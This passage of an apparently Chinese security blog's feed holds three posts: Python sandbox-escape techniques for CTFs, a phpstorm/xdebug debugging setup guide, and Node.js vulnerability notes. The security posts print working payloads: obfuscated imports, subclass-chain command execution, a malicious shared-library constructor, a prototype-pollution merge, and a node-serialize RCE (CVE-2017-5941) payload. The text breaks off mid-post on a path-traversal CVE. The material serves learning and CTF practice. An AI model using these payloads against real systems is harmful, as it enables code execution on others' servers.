class="string">'venv'</span>]</span></span><br></pre></td></tr></table></figure>

<p>也可以fuzz一下其他的方法比如 <code>sys</code>（<code>sys.modules[&quot;os&quot;].system(&quot;whoami&quot;)</code>），举一反三就行</p>
<ul>
<li><h4 id="花式import"><a href="#花式import" class="headerlink" title="花式import"></a>花式import</h4>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">'os'</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>) //注意导入importlib</span><br></pre></td></tr></table></figure>

<p>  如果通过 <code>sys.modules[&#39;os&#39;] = None</code>,那么就无法导入 <code>os</code>但import 的原理，本质上就是执行一遍导入的库。路径可以通过 <code>sys.path</code>查看，默认都是在 <code>/usr/lib/python3X/</code></p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">'/usr/lib/python3.8/os.py'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line"><span class="keyword">system</span>(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">sys.modules[<span class="string">'os'</span>]= <span class="string">'/usr/lib/python3.8/os.py'</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">del sys.modules[<span class="string">'os'</span>] //当 <span class="keyword">import</span> 一个模块时：<span class="keyword">import</span> A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 <span class="keyword">module</span> 对象，并加载 A。所以删了 sys.modules[<span class="string">'os'</span>] 只会让 Python 重新加载一次 os。</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h4><p>  字符串拼接</p>
  <figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure>

<p>  字符串逆转</p>
  <figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span>(<span class="string">'so'</span>[::-<span class="number">1</span>])<span class="selector-class">.system</span>(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<p>  变量替换</p>
  <figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">a</span>=<span class="string">'o'</span></span><br><span class="line">b=<span class="string">'s'</span></span><br><span class="line">__import__(<span class="keyword">a</span>+b).<span class="keyword">system</span>(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure>

<p>  编码</p>
  <figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>((<span class="variable">bytes.fromhex</span>(<span class="string">"6f73"</span>).decode())).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure>

<p>  别名</p>
  <figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">as</span> o</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="继承逃逸"><a href="#继承逃逸" class="headerlink" title="继承逃逸"></a>继承逃逸</h4><p>  python中万物皆对象。通过各种魔术函数可以在继承链上找到我们需要的函数。也可以通过脚本FUZZ一下</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这里只爆破了一层</span></span><br><span class="line"><span class="comment"># object</span></span><br><span class="line"><span class="comment"># [].__class__.__base__</span></span><br><span class="line"><span class="comment"># "".__class__.__mro__[-1]</span></span><br><span class="line">methods=[<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line"></span><br><span class="line">classes = [].__class__.__base__.__subclasses__()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line"></span><br><span class="line">    res[met] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(classes)):</span><br><span class="line">        cla = str(classes[i])</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> cla:</span><br><span class="line">            res[met].append(str(i) + <span class="string">" "</span> + cla)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># dir() 不会列出内置函数和变量名称所以 exec和eval只能爆破，或者利用其他包的__builtins__调用</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"__globals__"</span> <span class="keyword">in</span> dir(classes[i].__init__):</span><br><span class="line">            <span class="keyword">if</span> met <span class="keyword">in</span> classes[i].__init__.__globals__:</span><br><span class="line">                res[met].append(str(i)+ <span class="string">" "</span>+cla)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met + <span class="string">":"</span> + str(res[met]))</span><br></pre></td></tr></table></figure>

<p>  类的序号在不同的py版本，运行平台，以及import不同的包，都会造成<code>object</code>的子类数量不一样，序号也就不一样了。脚本也就构造下payload，远程打过去还得爆破序号。</p>
</li>
<li><h4 id="加载恶意so"><a href="#加载恶意so" class="headerlink" title="加载恶意so"></a>加载恶意so</h4><p>  利用<code>ctypes.LibraryLoader</code>加载恶意动态库执行命令。<code>ctypes</code>必须要导入，不然<code>object</code>不会有它。感觉有些鸡肋。</p>
<p>  evil.c</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ls -la  &gt; /tmp/ls_la"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  poc.py</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">167</span>](<span class="string">'/tmp/evil.so'</span>)</span><br></pre></td></tr></table></figure>

<p>  <img src="/2020/06/python-web学习/image-20200701212037508.png" alt="image-20200701212037508"></p>
</li>
<li><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>  过滤<code>[</code>、<code>]</code>，应对的方式就是将[]的功能用pop 、<code>__getitem__</code> 代替（实际上a[0]就是在内部调用了<code>a.__getitem__(0)</code> )</p>
<p>   <code>&#39;&#39;.__class__.__mro__.__getitem__(1).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</code></p>
</li>
</ul>
<ul>
<li><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>  <a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98" target="_blank" rel="noopener">沙盒逃逸备忘</a></p>
<p>  <a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python-沙箱逃逸</a></p>
<p>  <a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstrom+xdebug调试代码</title>
    <url>/2021/01/phpstrom-xdebug%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​        接下来想审计几个开源的cms，工欲善其事必先利其器，这里我用的是phpstrom+xdebug+phpstudy的组合。安装phpstrom和phpstudy这个不多说。</p><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><p>​        注意这里不要使用apache作为中间件，这样会导致调试过程中会话丢失(大概1分钟不到)。</p><a id="more"></a>

<p>后来发现其实是phpstudy的apache默认配置问题，修改一下就行</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210727084808790.png" alt="image-20210727084808790"></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;IfModule</span> <span class="string">mod_fcgid.c&gt;</span></span><br><span class="line"><span class="comment">	# php-cgi进程的生存时间</span></span><br><span class="line">true<span class="attr">FcgidProcessLifeTime</span> <span class="string">9999</span></span><br><span class="line"><span class="comment">	# php-cgi进程IO超时时间</span></span><br><span class="line">    <span class="attr">FcgidIOTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment">	# php-cgi进程连接超时时间</span></span><br><span class="line">    <span class="attr">FcgidConnectTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment">	# 上传文件的最大尺寸 100MB</span></span><br><span class="line">true<span class="attr">FcgidMaxRequestLen</span> <span class="string">104857600</span></span><br><span class="line"><span class="comment">	# php-cgi最大的进程数</span></span><br><span class="line"><span class="comment">	# FcgidMaxProcesses 5</span></span><br><span class="line"><span class="attr">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure>

<p>先启动nginx和mysql</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119185312944.png" alt="image-20210119185312944"></p>
<p>再新建网站</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119190147445.png" alt="image-20210119190147445"></p>
<p>这个默认配置就行，注意使用<strong>cms推荐的php版本</strong>。</p>
<p>打开网站能正常访问就行。</p>
<p>同时在 管理-&gt;php扩展-&gt; 勾选xdebug</p>
<p>打开对应版本的php.ini文件</p>
<p>在<code>[xdebug]</code>项添加idekey和打开远程调试</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210121121958881.png" alt="image-20210121121958881"></p>
<h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>​        将网站根目录作为项目打开</p>
<p>打开设置选择php版本</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191031796.png" alt="image-20210119191031796"></p>
<p>下拉php列表</p>
<p>配置服务器和phpstudy相同就行</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191134264.png" alt="image-20210119191134264"></p>
<p>下拉调试</p>
<p>选择DBGp代理</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191229837.png" alt="image-20210119191229837"></p>
<p>这里要注意的是这三个值要和php.ini中的对应</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM </span><br><span class="line"><span class="attr">xdebug.remote_host</span>=localhost </span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br></pre></td></tr></table></figure>

<p>在phpstorm 右上角添加配置</p>
<p>选择php web页面</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191734997.png" alt="image-20210119191734997"></p>
<p>点击 验证测试xdebug没问题</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191827554.png" alt="image-20210119191827554"></p>
<h3 id="浏览器安装Xdebug-helper"><a href="#浏览器安装Xdebug-helper" class="headerlink" title="浏览器安装Xdebug helper"></a>浏览器安装Xdebug helper</h3><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192132260.png" alt="image-20210119192132260"></p>
<p>在扩展选项中填写IDE key</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192225930.png" alt="image-20210119192225930"></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>先下好断点</p>
<p>然后点击监听</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192018629.png" alt="image-20210119192018629"></p>
<p>Shift+F10 运行</p>
<p>接着在浏览器将Xdebug helper选择debug模式</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192710255.png" alt="image-20210119192710255"></p>
<p>再去触发相应的代码，就能在断点处停下了</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119193010239.png" alt="image-20210119193010239"></p>
<p>接下来可以愉快的调试了！</p>
<p>对于运行在5.4及其以上的cms，调试时可以不使用phpstudy(需要xdebug插件),在右上角添加配置时选择php内置服务器即可</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119194552083.png" alt="image-20210119194552083"></p>
<p>这里是自己起了php监听，可以看到访问的请求，两种运行方法各有优劣。</p>
<p>后面又发现个问题</p>
<p>调试时会遇到debug会话未暂停的警告</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119194221935.png" alt="image-20210119194221935"></p>
<p>调试的网页也会报一个404错误，会影响后续的调试。</p>
<p>各种切换版本，修改配置，搜索引擎等操作，还是找不到解决办法。(救救孩子</p>
<p>所以打算弃了phpstudy，改用wsl2作为调试环境(我太难了)</p>
<p>后面发现，别偷懒直接设置在脚本第一行调试即可</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210727085451391.png" alt="image-20210727085451391"></p>
<h3 id="WSL2管理多版本php"><a href="#WSL2管理多版本php" class="headerlink" title="WSL2管理多版本php"></a>WSL2管理多版本php</h3><p>作为一个调试环境，如果只有一个php版本无疑是失败的！</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //添加仓库源</span><br><span class="line">sudo apt-get update						  //更新源</span><br><span class="line">sudo apt-get install php5.6				  //安装其他版本php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //安装必须的插件</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure>

<p>更多内容参考这篇<a href="https://justcode.ikeepstudying.com/2018/11/%E5%AE%89%E8%A3%85%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84php-php%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85-how-to-install-different-php-5-6-7-0-and-7-1-versions-in-ubuntu/" target="_blank" rel="noopener">文章</a></p>
<p>如果是kali等debian系可以参考一下命令</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure>

<h3 id="修改php-ini文件"><a href="#修改php-ini文件" class="headerlink" title="修改php.ini文件"></a>修改php.ini文件</h3><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123221353899.png" alt="image-20210123221353899"></p>
<p>添加 [xdebug]</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123224346250.png" alt="image-20210123224346250">，</p>
<p>这里要注意</p>
<p><strong>1.remote_host要填win10的wsl的ip，wsl不能直接通过localhost访问win10的端口</strong></p>
<p><strong>2.在win10防火墙的出站规则中把公用域的两个配置改成允许连接</strong></p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123232107298.png" alt="image-20210123232107298"></p>
<p>太草了，不是这个xdebug.log一辈子翻不了案</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222005027.png" alt="image-20210123222005027"></p>
<h3 id="PHPSTORM添加运行环境"><a href="#PHPSTORM添加运行环境" class="headerlink" title="PHPSTORM添加运行环境"></a>PHPSTORM添加运行环境</h3><p>这里的配置和上面一样，我就贴个图把</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222129044.png" alt="image-20210123222129044"></p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222154726.png" alt="image-20210123222154726"></p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222219179.png" alt="image-20210123222219179"></p>
<p>运行 监听 浏览器开启xdebug</p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222337715.png" alt="image-20210123222337715"></p>
<p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222355580.png" alt="image-20210123222355580"></p>
<p>心累- -！</p>
<p>还有个问题就是每次重启后win10的wsl网域会变化，所以xdebug的配置也要跟着变化</p>
<p>这里可以考虑把wsl设置为静态IP，但我的解决方案是写个脚本修改xdebug的配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=$(cat /etc/resolv.conf | grep nameserver |awk <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line"><span class="comment">#echo $ip</span></span><br><span class="line">sudo sed -i  <span class="string">"/^xdebug.remote_host/cxdebug.remote_host=<span class="variable">$ip</span>"</span> /etc/php/5.6/cli/php.ini</span><br></pre></td></tr></table></figure>

<p>另外一个解决办法是在php.ini</p>
<p>添加 <code>xdebug.remote_connect_back = 1</code> //如果开启，将忽略 xdebug.remote_host 的参数。它会根据访问的ip直接回连</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>调试</tag>
        <tag>phpstorm</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs学习</title>
    <url>/2020/06/nodejs%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-原型链污染"><a href="#1-原型链污染" class="headerlink" title="1.原型链污染"></a>1.原型链污染</h2><ul>
<li><code>prototype</code> 和 <code>__proto__</code></li>
</ul><p>每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener"><strong>原型链</strong></a>中的最后一个环节。</p><a id="more"></a>

<p><img src="/2020/06/nodejs学习/image-20200605161200256.png" alt="image-20200605161200256"></p>
<p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" target="_blank" rel="noopener"><code>Object</code></a> 的实例。</p>
<p>总结一下</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<ul>
<li><p>JS原型链继承</p>
<p>  所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a);</span><br><span class="line"><span class="built_in">console</span>.log(o.b);</span><br><span class="line"><span class="built_in">console</span>.log(o.c);</span><br><span class="line"><span class="built_in">console</span>.log(o.d);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p><img src="/2020/06/nodejs学习/image-20200605162929085.png" alt="image-20200605162929085"></p>
<p>console.log(o.b);打印了2 似乎没被影响，其实这是个<code>属性遮蔽</code> 当要访问b属性时，对象先在自身的属性中寻找b，如果不存在b,才会到 <code>__proto__</code>中寻找，一层层往上，直到找到b或者null</p>
<p>总结一下</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承机制</li>
</ol>
<ul>
<li><p>原型链污染</p>
<p>  原型链污染就是修改了类的 <code>prototype</code>那么将可以影响所有和这个对象来自同一个类、父祖类的对象</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>哪些情况下存在原型链污染<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
</li>
</ul>
<p>简单例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/nodejs学习/image-20200605165118904.png" alt="image-20200605165118904"></p>
<p>需要注意的是一定要使用JSON格式，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>我们用JavaScript创建o2的过程，如果使用（<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>），<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<h2 id="2-危险函数"><a href="#2-危险函数" class="headerlink" title="2.危险函数"></a>2.危险函数</h2><p>eval()</p>
<p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p>
<p>漏洞利用</p>
<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p>
<p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令</p>
<p>类似命令</p>
<p>间隔两秒执行函数：</p>
<ul>
<li>setInteval(some_function, 2000)</li>
</ul>
<p>两秒后执行函数：</p>
<ul>
<li>setTimeout(some_function, 2000);</li>
</ul>
<p>some_function处就类似于eval函数的参数</p>
<p>输出HelloWorld：</p>
<ul>
<li>Function(“console.log(‘HelloWolrd’)”)()</li>
</ul>
<p>类似于php中的create_function</p>
<h2 id="3-node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#3-node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="3.node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>3.node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2><ul>
<li>了解什么是IIFE：</li>
</ul>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/立即执行函数表达式" target="_blank" rel="noopener">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
<p>IIFE一般写成下面的形式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>node-serialize@0.0.4</code>漏洞点</p>
<p>  漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p>
<p>  <img src="/2020/06/nodejs学习/image-20200605172038278.png" alt="image-20200605172038278"></p>
</li>
</ul>
<p>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行</p>
<ul>
<li>构造Payload</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"序列化生成的 Payload: \n"</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure>

<p>生成的Payload为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>传递给unserialize(注意转义单引号)：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/nodejs学习/image-20200605172508592.png" alt="image-20200605172508592"></p>
<h2 id="4-Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#4-Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="4.Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>4.Node.js 目录穿越漏洞复现(CVE-2017-14849)</h2><p>漏洞影响的版本：</p>
<ul>
<li><p>Node.js 8.5.0 + Express 3.19.0-3.21.2</p>
</li>
<li><p>Node.js 8.5.0 + Express 4.11.0-4.15.5</p>
<p>  Express依赖Send组件，Send组件0.11.0-0.15.6版本pipe()函数中，如图：</p>
</li>
</ul>
<p><img src="/2020/06/nodejs学习/image-20200605211132980.png" alt="image-20200605211132980"></p>
<p>Send模块通过<code>normalize(&#39;.&#39; + sep + path)</code>标准化路径path后，并没有赋值给path，而是仅仅判断了下是否存在目录跳转字符。如果我们能绕过目录跳转字符的判断，就能把目录跳转字符带入545行的<code>join(root, path)</code>函数中，跳转到我们想要跳转到的目录中，这是Send模块的一个bug，目前已经修复。</p>
<p>再来看Node.js，Node.js 8.5.0对path.js文件中的<code>normalizeStringPosix</code>函数进行了修改，使其能够对路径做到如下的标准化：</p>
